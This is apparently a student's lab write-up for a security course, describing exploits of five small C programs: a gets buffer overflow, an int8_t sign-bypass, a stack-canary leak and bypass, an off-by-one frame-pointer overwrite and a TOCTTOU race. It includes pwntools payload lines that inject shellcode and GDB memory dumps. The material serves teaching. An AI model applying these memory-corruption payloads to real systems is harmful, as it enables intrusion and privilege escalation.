# Write-Up


## Remus
### Main Idea
I utilized a `gets` vulnerability in order to continue writing into the stack past designated buffer. This allowed me to write into the location of memroy where the `rip` was stored. I then wrote the `SHELLCODE` into the address right after the `rip`, and then overwrote `rip` to point to the address of the `SHELLCODE`. This is because once the function returns, it will automatically move set the `eip` to `rip` and resume running the program. We can take advatange of this and make `eip` run our `SHELLCODE` instead of returning and continuing the program.


## Spica
### Main Idea
After looking at the `telemetry.c` code closely, I realized that I could utilize a integer type vulnerability that was taught in lecture. The spec mentions there is a piece of code that checks to make sure that the file read must have a byte size limit. The lines of code I spotted in `telemetry.c`:
```
if (bytes_read == 0 || size > 128) {
    return;
}
```
This check immediately made me think of the example given in lecture, where the attack was based upon the fact that the `size` variable was poorly initialized as an `int` instead of a `size_t`. Since the `int` type was signed, the attack would take advantage of two's complement representing a large unsigned number as a negative number, therefore bypassing the `size > 128` check. Lo and behold, in line 7: `int8_t size;`.
### Testing
I had to check one more thing. I went online to look at the C man pages for the `fread` function signature, and confirmed that its `arg2` was the type `size_t`. This would enable me to set `size` to be `0xff`, which is the largest possible number for the unsigned 8 bit integer, but actually just `-1` in the signed world of `int8_t`.
### Exploit Process
The first `fread` would happily write `0xff` into `size`, which would then pass the `if` check due to it comparing `int8_t` type against `128`. Then after that, the second `fread` function call will treat `size` like a `size_t` (unsigned int), and now I can write past where I am not supposed to. After gaining access to the area in memory outside of the file limit, all I needed to do was find where the return address was stored, which would inevitably be executed once the function returned.
### Magic Numbers
Using GDB, I found the address of the `rip` and subtracted it from the address of the beginning of `msg`. The address of `rip` was `148` bytes away from the start of `msg`, so I filled in garbage for `148` bytes till the location of `rip`, then overwrote `rip` to be another address just `4` bytes ahead, and then placed the `SHELLCODE` right there, and boom. Exploited.
### GDB
##### `info frame` output:
```
(gdb) i f
Stack level 0, frame at 0xffffd700:
 eip = 0x8049276 in display (telemetry.c:24); saved eip = 0xffffd700
 called by frame at 0x41414149
 source language c.
 Arglist at 0xffffd6f8, args: path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>
 Locals at 0xffffd6f8, Previous frame's sp is 0xffffd700
 Saved registers:
  ebp at 0xffffd6f8, eip at 0xffffd6fc
(gdb) 
```
`rip` is at `0xffffd6fc`.

#### Before exploit:
```
(gdb) b 18
Breakpoint 2 at 0x8049235: file telemetry.c, line 18.
(gdb) r
Starting program: /home/spica/telemetry navigation

Breakpoint 2, display (path=0xffffd8bb "navigation") at telemetry.c:18
18          bytes_read = fread(&size, 1, 1, file);
(gdb) x/44x msg  
0xffffd668:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd678:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd688:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd698:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6c8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6d8:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6e8:     0x00000000      0x0804e000      0x00000000      0xffffdfe2
0xffffd6f8:     0xffffd718     >0x080492bd<     0xffffd8bb      0x00000000
0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffd730
(gdb) 
```
Breakpoint is placed before first fread.\
`rip` is labeled with surrounding `> <`.

#### After exploit:
```
(gdb) c
Continuing.

Breakpoint 1, display (path=0xcd58326a <error: Cannot access memory at address 0xcd58326a>) at telemetry.c:24
24          puts(msg);
(gdb) x/44x msg
0xffffd668:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd678:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd688:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd698:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e8:     0x000000d2      0x41414141      0x41414141      0x41414141
0xffffd6f8:     0x41414141     >0xffffd700<     0xcd58326a      0x89c38980
0xffffd708:     0x58476ac1      0xc03180cd      0x692d6850      0xe2896969
```
`msg` is overwritten with A's (`41` in hexadecimal ASCII), and continues overwriting all the way to `rip` (labaled with `> <`)
The `rip` is overwritten with an address which is just `4` bytes in front, and at that address you can see the `SHELLCODE`, which looks very different than in the **Before** GDB dump.


## Polaris

### Main Idea
With one look at the problem spec I new that this time I could not simply perform any sort of write-past exploit, due the existence of the canary—which would immediately throw and error if it detected a change of itself. Since I felt this was going to be difficult (I ended up spending over 14 total hours on this problem unfortunately) I took a long look at `dehexify.c`. I had remembered from earlier lectures that the `gets` function was highly prone to write-past attacks, and I spotted the function within the `dehexify` function and I began thinking about my approach. I spent an hour trying to come up with any method to "hop" over the canary with no avail, so I decided to just try and overwite the canary for the heck of it.

### Testing
I performed the following tests within my interact:
```
p.send('A' * 15 + '\n)
```
This ended up overwriting the canary and—as expected—immediately threw a segmentation fault.
```
p.send('A' * 15 + '\\x')
```
I experimented some more.
```
p.send('A' * 16 + '0')
```
After trying these three lines I definitely new there was no way to attempt to overwrite the canary and still have a successful exploit. I knew I had to some how "jump" the canary bits. I recall from lecture that the method to "jump" the bits was to actually simply look at the canary (possibly with GDB) and then, during an overflow write attack, simply write the canary itself when you reach it and then continue with garbage `AAAAA`'s afterward. Going into GDB, I located the canary since they are always located between the local variables and the `sfp` and `rip` of the stack frame's function. I then ran into another problem: I didn't realize at first but it totally made sense: the canary would be randomized upon every run of the program. What good would the canary be if it was never randomized? A simple hex editor could easily crack the canary and a ton of exploits would be on their way. I had to find another section of code that could be exploited in order to print out the canary *during* that execution so that I could immediately pass the printed canary back into the program to exploit it.

### Second Idea
After browsing Ed forums and being stuck for a couple more hours, I found a post that hinted on the use of the `i` and `j` variables as part of the attack. I realized that a particular oversight from the programmer allowed me to abuse the hexadecimal cnoverter. The `while` loop in `dehexify` would take 4 characters of hexadecimal (`\x41` for example), and then convert it into one single ASCII letter (`A`). In the code I saw `i += 3` within the `if` statement of the converter, which made me realize that I could possibly cause `dehexify` to read past it's designated buffer size *without* overwriting the canary at all. Finally, I read through the spec again and noticed that in this case since the program expected the user to enter an actual hexadecimal as literal characters, all backslashes (`\`) had to be escaped with the escape character (which is also the backslash) in order for the program to recognize the backslash itself as part of the hexadecimal format. I got to work experimenting.

### Testing 2
I tried many different inputs to try and cause `i` to be way ahead of `j` in order to "skip" the read towards canary without actually writing anything over it. At this moment I still had not really understood how the skipping worked, but just that skipping was possible and existed as a possible exploit, hence the strange test inputs. Here are some of the `p.send`'s I tried:
```
p.send('\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\\x\n')
p.send('\\x\\x\\x\\x\\x\\x\\x\n')
```
At this point I still did not fully grasp the format for hexadecimal, so I thought there was only one denoted character after the escaped double backslashes.
```
p.send('\\xAA\\xAA\\xAA\\xAA\\xAA\\xAA\\xAA\n'
p.send('\\xAA\\xAA\\xAA\\xAA\\\n\n')
```
After figuring out my error, I fixed my input and went backt to the trusty `AA` garbage byte. Here, I began to slowly get closer to solving part 1 of this exploit.

### Exploit Process
After this point and getting many many segmentation faults, I slowed down on brute forcing and thought for a moment how hopping `i` would actually work. I sat down and drew out a diagram of the bytes being tracked by `j` and then hopping 4 bytes with `i` to follow how both variables moved forward through a string as it was passed into the program. I realized that while `\\xAA` was `4` bytes (the `\\` counts as one character because the first backslash is escaping the second backslash, making it a literal backslash character), `i` was interpretting it as a single byte character. Although this might have been obvious, I did not fully understand how to precisely reach the canary. I realized, though, that since the buffer was `16` bytes long, `j` would actually be `3` after hopping all `16` bytes. This means that I would be able to make the program output more than it would input, by `i - j` amount. Since the canary was only `4` bytes, this was definitely possible. I got to work "hopping" `j` 4 times:
```
p.send('\\xAA\\xAA\\xAA\\xAA')
```
This still seg-faulted, and after being confused for a while I realized that `p.send` would simply always be unhappy if there was no newline `\n` character at the end of all inputs, so I tried:
```
p.send('\\xAA\\xAA\\xAA\\xAA\n')
```
But then quickly realized that this would seg-fault since although `j` was still relatively small due to hopping, `i` had blown past 15. I quickly realized I could fit a newline character right within the garbage, since each hexadecimal escape contained *two* hexadecimals:
```
p.send('\\xAA\\xAA\\xAA\\xA\n')
```
I finally found sucess after fitting the newline character within the hexadecimal escape character. This `p.send` finally did not seg-fault, so I was happy with that.\
\
Next, I began working on the receive code. With this `p.send` code, `i` is at `15` while `j` is at `3`. Since I know the canary is directly after the writable bytes, and the canary was `4` bytes, I wanted to receive all the way to the end of canary. Since `j` dictates the length of the end result post-conversion, my garbage's length would be `4` bytes long. The canary would be the immediate next `4` bytes after that. Soforth, I tried receiving `8` total bytes, `4` bytes of garbage `+` `4` bytes of canary:
```
print(p.recv(8))
```
This worked, although the Python `print` output was unintelligble since it was trying to convert raw bits into ASCII, I assume. The next thing was to extract the canary out of these received `8` bytes.
```
receive = p.recv(8)
canary = receive[4:8]
```
Now that I successfully extracted the canary, all that was left is to perform the second `p.send`, which would now write into `buffer` and then subsequently into the canary, which I have now obtained.

### Testing 3
I began writing the `p.send` and debugging with GDB to ensure that I was accessing the correct bytes of data. Here was the first iteration:
```
p.send('A' * 16 + canary)
```
In this iteration I just wanted to ensure that the canary was properly written into where it was supposed to be. I used GDB to check the canary during the curent runthrough and then compared it to what my exploit writes after stepping over the while loop. Indeed, it was successful, so theoretically this `p.send` should run fine. But it did not. I spent a couple minutes figuring out why, and I realized that I still had to follow the requirements for every `p.send`: strings had to end with the newline character. After adding my newline character, I continued writing more of my exploit.
```
p.send('A' * 15 + '\n' + canary + 'A' * 12 + '\xAA\xAA\xAA\xAA')
```
After trying this lien of code everything suddenly broke, so I got really confused. I spent a long time attempting to figure out why this `p.send` was not working. I finally solved the problem after visiting OH. Turns out, this `p.send` sees the newline character after adding `15` `A`'s and immediately terminates, ignoring the rest of my exploit, which isn't what we want. But I still need to be able to place a newline character right at the end of `buffer` or else the program would complain. I got help in OH and learned that we could trick the code by placing the null terminator within my `p.send`. This would not prematurely end `p.send` but would ensure the program would not complain overall since it would still "count" as the end of the string. After replacing the newline character with a null terminator, my `p.send` was now correctly filling up `buffer` with garbage, "hopping" over the canary, adding more garbage until it reaches the RIP, and then filling RIP with my garbage. Now that I could see that within GDB, I continued writing my exploit.
```
p.send('A' * 15 + '\x00' + canary + 'A' * 12 + '\x20\xd7\xff\xff' + SHELLCODE)
```
This `p.send` worked great, and I saw it work within GDB. It perfectly hops over canary and writes my address into RIP, which is the address of the following 4 bytes. Then it stores the `SHELLCODE`. GDB shows the exploit working and causing EIP to jupm to my `SHELLCODE`, but when running the program simply with `./exploit`, it was still seg-faulting. I spent another hour trying to figure out what I had missed or if the canary was not being hopped correctly, but I was extremely sure it was not the problem of the canary. After thinking it through again, I finally realized my problem, which I actually had solved previously: `p.send`'s expected newline. From OH I had learned how to trick `p.send` to write a newline character without actually stopping, I still needed to stop `p.send`. So I added a real `\n` to the end of my exploit to officially terminate `p.send`.
```
p.send('A' * 15 + '\x00' + canary + 'A' * 12 + '\x20\xd7\xff\xff' + SHELLCODE + '\n')
```
Finally, my exploit had worked. Success.

### Magic Numbers
From the source code I knew that `buffer` would be size `BUFLEN` which was `16` bytes. I made the garbage `15` bytes in length to accomodate for the fake newline character, the null terminator. In GDB, I found the address of the RIP and then found the address of the end of `buffer`. From lecture I knew the canary would be stored directly after all the local variables, so in this case, since the last local variable to be instantiated in the source code was `buffer`, canary would be stored `0` bytes after `buffer`. Then, to find the new offset, I simply subtracted the address of RIP from the length of canary (`4` bytes), which is `12`.

### GDB
```
(gdb) r
Starting program: /home/polaris/dehexify < /tmp/tmp.AclHnp > /tmp/tmp.EMHnFf

Breakpoint 1, dehexify () at dehexify.c:20
20          int i = 0, j = 0;
(gdb) x/16x c.answer
0xffffd6ec:     0xffffd88b      0x00000000      0x00000000      0x00000000
0xffffd6fc:     0x00000000      0x00000000      0xffffdfe1      0x0804cfe8
0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
(gdb) p &c.buffer
$1 = (char (*)[16]) 0xffffd6fc
(gdb) i f
Stack level 0, frame at 0xffffd720:
 eip = 0x8049220 in dehexify (dehexify.c:20); saved eip = 0x8049341
 called by frame at 0xffffd740
 source language c.
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c
```
From this GDB output you can see the key important parts of the stack, starting at the bottom with `answer` at `0xffffd6ec`. Moving up you can see `buffer` at `0xffffd6fc`. They both have garbage currently since the program just started and they were initialized without any intial value. Below `buffer` is the canary, which—although cannot confirmed with GDB, was taught in lecture to be directly after all local variables on the stack. Using `info frame` you can figure out that the EBP is at `0xffffd718`. From lecture, the canary is `4` bytes, therefore the bytes in between the canary at `0xffffd70c` and the EBP at `0xffffd718` are just compiler padding. Then from the `info frame` output, you can see the EIP which is located at `0xffffd71c`. Moving onto the first step of the exploit:
```
(gdb) c
Continuing.

Breakpoint 2, dehexify () at dehexify.c:36
36          c.answer[j] = 0;
(gdb) x/16x c.answer
0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0041785c
0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
(gdb) p i
$2 = 24
(gdb) p j
$3 = 12
```
After the first part of the exploit (`p.send('\\xAA\\xAA\\xAA\\xA\n')`), `answer` and `buffer` have changed. The hex translates to what was sent in the `p.send` command. You can see `41`s scattered through `buffer` which is the byte representation of the letter `A`. I've also outputted `i` and `j` so you can see how `i` has hopped way past `j` which would aid in this exploit.
```
(gdb) c
Continuing.

Breakpoint 1, dehexify () at dehexify.c:20
20          int i = 0, j = 0;
(gdb) x/16x c.answer
0xffffd6ec:     0xa9eaeaea      0x1951a99a      0x0804d020      0x00000000
0xffffd6fc:     0x4141785c      0x4141785c      0x4141785c      0x0804cfe8
0xffffd70c:     0x1951a99a      0x0804d020      0x00000000      0xffffd728
0xffffd71c:     0x08049341      0x00000000      0xffffd740      0xffffd7bc
```
After continuing, nothing has changed, but the exploit has now obtained the canary through `p.recv(8)`. The program is run again from the second `p.send`.
```
(gdb) c
Continuing.

Breakpoint 2, dehexify () at dehexify.c:36
36          c.answer[j] = 0;
(gdb) x/16x c.answer
0xffffd6ec:     0x41414141      0x41414141      0x41414141      0x00414141
0xffffd6fc:     0x41414141      0x41414141      0x41414141      0x00414141
0xffffd70c:     0x1951a99a      0x41414141      0x41414141      0x41414141
0xffffd71c:     0xffffd720      0xdb31c031      0xd231c931      0xb05b32eb
```
Now GDB reflects the effect of the second `p.send`, the bulk of the exploit. You can see both `answer` and `buffer` are filled with garbage, and then the canary value following immediately after `buffer` at `0xffffd70c`, and then more garbage after the canary to show that the canary was actually overwritten ("hopped"), and then at `0xffffd71c`, which recall was the EIP, is overwritten with the hex values from my `p.send`: `0xffffd720`. Then immediately following is the `SHELLCODE`. Exploit success.


## Vega

### Main Idea
Inspecting the `flipper.c` file I knew that this would be a slightly difficult problem. I knew there had to be a reason wy `dispatch` and `invoke` existed. I fully understanding how the C code works, I realized that there was an error by the programmer in line 8. In the `for` loop, the programmer meant to loop through each character in `input`, which is `64` bytes long. The programmer's mistake was to loop through one byte after `input` due to the `for` loop condition being `i < n && i <= 64`. Through this I realized the point of having `dispatch` and `invoke` as separate functions from `flip` was to facilitate an Off-By-One attack, which will work by craeting a fake SFP and fake RIP of the function two stack frames above the current function where a writeable local variable is stored. Time to begin the exploit.

### Testing
I began testing ways I could take advantage of the extra `for` loop iteration. The exploit itself was pretty straight forward and I followed it's steps from my notes from lecture. There were two main things that I had to figure out before fully carrying out the exploit. First, where to store the `SHELLCODE`, since with Off-By-One exploits you only get access to one extra byte instead of infinitely writing off into the distance. Second, since this program converts lowercase letters to uppercase letters and vice versa, I had to figure out away to still input my exploit without being affected by the conversion. On Ed I found many people utilized the environment variable that the problem gave us access to in order to store the `SHELLCODE`. Since environment variables can be however length as required, and is stored at the very top of the stack (accessible to everything below it which essentially means the entire program), I decided to follow along and place my `SHELLCODE` as an environment variable using the `egg` file. I found the address of my `SHELLCODE` environment variable by using GDB and printing all environment variables until I found the one labelled `EGG`. I also realized that if I simply just input the address I wanted and then checked the resulting address in memory using GDB, the address inside memory would be my address but `OR`ed with `0x20`. This would convert lowercase to uppercase for all letters in ASCII. Since the `OR` operation is reversible, if I copied the address from GDB and used the copied address as my input, my actual desired address would then be stored in memory after the `OR` operation. I would continue to use this neat trick throughout this problem rather than having to manually `OR` all my addresses myself.

### Exploit Process
Following my notes from lecture, I began by writing the fake SFP and RIP of the parent stack frame into the `buf` local variable. Since the fake SFP did not really matter, I just filled it with garbage (using `a` instead of `A` since I better recognized the `\x41`s in GDB). Then for the extra byte I had access to, I just changed it to point to my fake SFP, since the `4` bytes directly above `buf` was the real SFP. This would overall execute the exploit that was taught in lecture. Since the exploit seemed pretty straight forward, I was confused when it kept seg-faulting. I got so stuck I made a private Ed post asking for help. From the hint I received, I realized that I had assumed one thing: I had assumed that the `SHELLCODE` would start at the very beginning of the environment variable's location. Turns out there was a `4` byte padding before the actual `SHELLCODE`. I still ran into a bug where the shell would appear but the privilege escalation would not occur. After some more debugging, I realized I had simply made a careless mistake when adding addresses and completely skipped over `16` bytes as a result. After fixing all my errors and misstakes, the exploit was successful.

### Magic Numbers
SFP is `4` bytes long since it is an address, so I wrote `4` bytes of garbage at the beginning of `buf`. Afterwards, in order to get to the extra byte at the end of `buf`, I took the length of `buf`, `64` bytes, and subtracted the length of the SFP and the RIP which I had written at the beginning of `buf`. `64 - 4 - 4 = 56`, so I added `56` bytes of garbage between the RIP and my extra byte.

### GDB
```
(gdb) b 9
Breakpoint 1 at 0x8049202: file flipper.c, line 9.
(gdb) r
Starting program: /home/vega/flipper $'aaaa\274\377\337\337aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@'

Breakpoint 1, flip (buf=0xffffd660 "", input=0xffffd84f "aaaa\274\377\337\337", 'a' <repeats 56 times>, "@") at flipper.c:9
9               buf[i] = input[i] ^ 0x20;
(gdb) i f
Stack level 0, frame at 0xffffd658:
 eip = 0x8049202 in flip (flipper.c:9); saved eip = 0x804925d
 called by frame at 0xffffd6a8
 source language c.
 Arglist at 0xffffd650, args: buf=0xffffd660 "", 
    input=0xffffd84f "aaaa\274\377\337\337", 'a' <repeats 56 times>, "@"
 Locals at 0xffffd650, Previous frame's sp is 0xffffd658
 Saved registers:
  ebp at 0xffffd650, eip at 0xffffd654
(gdb) x/16x buf
0xffffd660:     0x00000000      0x00000001      0x00000000      0xffffd81b
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
0xffffd690:     0x00000000      0x00000000      0x00000000      0x00000000
```
When I first ran GDB this way, I was confused since GDB said the saved EBP and EIP was actually below `buf`, meaning I couldn't get access to it. I decided to ignore this and trust my lecture notes in that the SFP I was supposed to exploit was above `buf` even though GDB wouldn't admit that. Later on Ed I realized that since I had placed my breakpoint within the `flip` function, the `buf` that I had hex dumped was actually the `char*` from the `buf` initiated in the `invoke` function. Placing the breakpoint in `invoke` and running `info frame` again shows the correct SFP and RIP addresses:
```
(gdb) b 19
Breakpoint 1 at 0x8049251: file flipper.c, line 19.
(gdb) r
Starting program: /home/vega/flipper $'aaaa\274\377\337\337aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaa@'

Breakpoint 1, invoke (in=0xffffd84f "aaaa\274\377\337\337", 'a' <repeats 56 times>, "@") at flipper.c:19
19          flip(buf, in);
(gdb) i f
Stack level 0, frame at 0xffffd6a8:
 eip = 0x8049251 in invoke (flipper.c:19); saved eip = 0x804927a
 called by frame at 0xffffd6b4
 source language c.
 Arglist at 0xffffd6a0, args: in=0xffffd84f "aaaa\274\377\337\337", 'a' <repeats 56 times>, "@"
 Locals at 0xffffd6a0, Previous frame's sp is 0xffffd6a8
 Saved registers:
  ebp at 0xffffd6a0, eip at 0xffffd6a4
(gdb) x/20x buf
0xffffd660:     0x00000000      0x00000001      0x00000000      0xffffd81b
0xffffd670:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd680:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
0xffffd690:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd6a0:     0xffffd6ac      0x0804927a      0xffffd84f      0xffffd6b8
```
Now you can see the real saved EBP and saved EIP right above `buf`. This is the memory before. Now lets run my exploit:
```
(gdb) n
20          puts(buf);
(gdb) n
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`O@o
21      }
(gdb) x/20x buf
0xffffd660:     0x41414141      0xffffdf9c      0x41414141      0x41414141
0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd680:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd690:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6a0:     0xffffd660      0x0804927a      0xffffd84f      0xffffd6b8
```
After my exploit, you can see all the garbage `\x41`s as well as the changed SFP at in the last row. The SFP at `0xffffd6a0` was changed from `0xffffd6ac` to `0xffffd660` which points back to the beginning of `buf` as part of the Off-By-One exploit. You can also see my fake RIP at `0xffffd664`. I figured this out with the GDB by printing out environment variables until I found the `egg`:
```
(gdb) p environ
$1 = (char **) 0xffffd740
(gdb) p environ[1]
$2 = 0xffffd899 "PAD=", '\377' <repeats 196 times>...
(gdb) p environ[2]
$3 = 0xffffdf7e "TERM=screen"
(gdb) p environ[3]
$4 = 0xffffdf8a "SHELL=/bin/sh"
(gdb) p environ[4]
$5 = 0xffffdf98 "EGG=j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/bin\211\343PRQS\211\341\061Ұ\v̀"
```
An oversight by simply printing was that I couldn't read the jumble that was printed out, which resulted in me not realizing that the `SHELLCODE` was actually stored only after some compiler padding. The hint from my private Ed post that I had mentioned earlier led me to realizing I could just perform a hex dump:
```
(gdb) x/4x environ[4]
0xffffdf98:     0x3d474745      0xcd58326a      0x89c38980      0x58476ac1
```
Checking the `SHELLCODE` in my `egg` file, the first `4` bytes were `\x6a\x32\x58\xcd` which lines up NOT with the address `0xffffdf98` but rather the address `4` bytes after: `0xffffdf9c`. Unfortunately, I made the aforementioned careless mistake and thought `0xffffdf98 + 4` was `0xffffdfac` rather than `0xffffdf9c`. I subsequently fixed this later on and finally solved the problem.


## Deneb

### Main Idea
Since this problem is similar to Spica, I decided to refresh myself with how I approached Spica. After a refresher, I tried to look for a similar method to solving this problem. I figured that, once again, I could overflow the the `uint32_t`. The difference from Spica is that in the the Spica problem, the unsigned integer I overflowed as a `uint8_t` which was substatially smaller in size. Another important difference, though, was the input method, in which in this problem decimals were inputted instead of hexadecimal.

### Testing
I figured if I just inputed `-1` it would achieve the same thing, instead of having to to type in the hexadecimal like in Spica. Besides this part of the exploit, I did not find any more similarities to Spica, so I decided to continue looking at the `orbit.c` to look for more vulnerabilities. After being stuck for a while, I checked Ed and came across a hint that involved a TOCTTOU attack. This made me realize the hint given in the spec which suggested having two terminals open. I decide to skip more testing the attack with two terminals and go straight into programming since I understood how to execute the attack with my lecture notes.

### Exploit Process
I left much of the default code in the `interact` file the same and added just a couple of my own lines. I removed the default `p.send` line and added my TOCTTOU attack right before my own `-1` `p.send` line. This will allow me to change the `hack` file *after* the `file_too_big` function error checks the file size. I copied the file opening code at the beginning of the file and then began writing my code for the `f.write` function. I knew that I needed to input garbage into `buf` to get to the RIP just like the previous problems, so I whipped out the GDB and began testing.

### Magic Numbers
The `buf` variable is a character array size `MAX_BUFFSIZE` which is defined at the top of the `orbic.c` file as `128` bytes. I wrote garbage for `127` bytes and then added a newline character in order to keep `f.write` happy. I also found the location of the RIP to be at `0xffffd73c` and subtracted this address from the end of `buf` which is `0xffffd728`. `0xffffd73c - 0xffffd728 = 20`. Therefore, `20` bytes of garbage needs to be added after filling up `buf` in order to get to the RIP.

### GDB
```
(gdb) b 32
Breakpoint 1 at 0x8049238: file orbit.c, line 32.
(gdb) r
Starting program: /home/deneb/orbit < /tmp/tmp.EGgCKb > /tmp/tmp.DMleKp

Breakpoint 1, read_file () at orbit.c:32
32          fd = open(FILENAME, O_RDONLY);
(gdb) x/40x buf
0xffffd6a8:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffd6b8:     0x00000000      0x0804904a      0x00000000      0x000003ed
0xffffd6c8:     0x000003ed      0x000003ed      0x000003ed      0xffffd8ab
0xffffd6d8:     0x078bfbfd      0x00000064      0x00000000      0x00000000
0xffffd6e8:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd6f8:     0x00000000      0xffffd89b      0x00000000      0x00000000
0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffdfe6
0xffffd718:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
0xffffd728:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd738:     0xffffd748      0x0804939c      0x00000001      0x08049391
(gdb) i f
Stack level 0, frame at 0xffffd740:
 eip = 0x8049238 in read_file (orbit.c:32); saved eip = 0x804939c
 called by frame at 0xffffd750
n%s", buf);                                                     \ source language c.
 Arglist at 0xffffd738, args: 
 Locals at 0xffffd738, Previous frame's sp is 0xffffd740
 Saved registers:
  ebp at 0xffffd738, eip at 0xffffd73c
```
This is the hex dump right when the program is started and before the exploit has begun. You can see that there are actually a couple of rows of compiler padding between the end of `buf` and the saved ebp and eip. I accounted for that in my exploit as stated in the **Magic Numbers** section above.
```
(gdb) b 39
Breakpoint 2 at 0x80492af: file orbit.c, line 41.
(gdb) c
Continuing.

Breakpoint 2, read_file () at orbit.c:41
41          printf("How many bytes should I read? ");
(gdb) x/40x buf
0xffffd6a8:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffd6b8:     0x00000000      0x0804904a      0x00000000      0x000003ed
0xffffd6c8:     0x000003ed      0x000003ed      0x000003ed      0xffffd8ab
0xffffd6d8:     0x078bfbfd      0x00000064      0x00000000      0x00000000
0xffffd6e8:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd6f8:     0x00000000      0xffffd89b      0x00000000      0x00000000
0xffffd708:     0x00000000      0x00000000      0x00000000      0xffffdfe6
0xffffd718:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
0xffffd728:     0x00000000      0x00000003      0x00000000      0x00000000
0xffffd738:     0xffffd748      0x0804939c      0x00000001      0x08049391
(gdb) p buf
```
After jumping to the next breakpoint (after the file read), `buf` reflects the contents of the file before the exploit occurs. In the next line of code, the program will stall as it awaits the user prompt for how many bytes to read.
```
(gdb) b 53
Breakpoint 3 at 0x8049369: file orbit.c, line 53.
(gdb) c
Continuing.

Breakpoint 3, read_file () at orbit.c:53
53          printf("Here is the file!\n%s", buf);
(gdb) x/40x buf
0xffffd6a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd6f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd708:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd718:     0x41414141      0x41414141      0x41414141      0x0a414141
0xffffd728:     0x000000e0      0x61616161      0x61616161      0x61616161
0xffffd738:     0x61616161      0xffffd740      0xdb31c031      0xd231c931
```
Jumping to the final breakpoint, during the stall, the file is overwritten with my exploit, which overflows `buf` and into the SFP and RIP, writing garbage into the SFP (`0x61616161`), and the address to `SHELLCODE` in the RIP. Then the `read_file` function "returns" and `SHELLCODE` is run. Exploit complete.